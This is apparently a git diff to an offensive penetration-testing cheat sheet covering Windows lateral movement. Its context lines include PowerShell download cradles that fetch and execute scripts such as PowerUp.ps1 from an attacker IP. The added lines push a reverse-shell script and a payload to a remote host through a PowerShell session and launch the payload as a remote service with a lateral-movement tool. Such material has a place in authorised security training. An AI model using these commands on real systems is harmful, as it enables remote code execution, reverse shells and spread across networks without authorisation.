@@ -1316,6 +1316,22 @@ powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('h
 (New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
 ```
 <br>
+
+### New_Session
+
+```powershell
+$sess = New-PSSession -ComputerName <Name>
+```
+
+<br>
+
+### Copy_to_session
+
+```powershell
+Copy-Item -Path C:\Users\public\rev.ps1 -Destination 'C:\Users\public\rev.ps1' -ToSession $sess
+```
+
+<br>
  
 ### Powershell_Cradle
 ```powershell
@@ -1399,6 +1415,9 @@ $method.Invoke(0, $null)
 - [lateralmovement](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Fileless%20Lateral%20Movement)
 ```
 - copy .\payload.exe \\server\share$\windows\tasks
+or
+- $sess = New-PSSession -ComputerName <Name>
+- Copy-item -path C:\users\puublic\payload.ps1 -destination 'C:\users\public\payload.ps1' -tosession $sess
 - latmov.exe <server> senorservice "c:\windows\tasks\payload.exe"
 ```
 
